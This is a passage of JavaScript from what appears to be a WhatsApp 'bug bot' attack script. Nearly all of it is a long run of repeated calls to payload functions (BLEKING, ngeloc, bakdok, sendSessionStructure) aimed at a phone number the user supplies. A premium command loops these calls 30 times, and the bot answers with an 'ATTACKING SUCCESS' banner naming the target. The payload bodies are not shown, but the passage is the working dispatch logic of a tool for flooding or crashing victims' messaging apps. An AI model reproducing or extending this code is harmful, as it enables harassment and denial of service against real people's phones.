await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case 'agler-system': case 'agler-system': case 'agler-system': case 'agler-forger': 
if (!isPremium) return reply(mess.only.premium)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply(bugres)
for (let i = 0; i < 30; i++) {
await sendSessionStructure(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
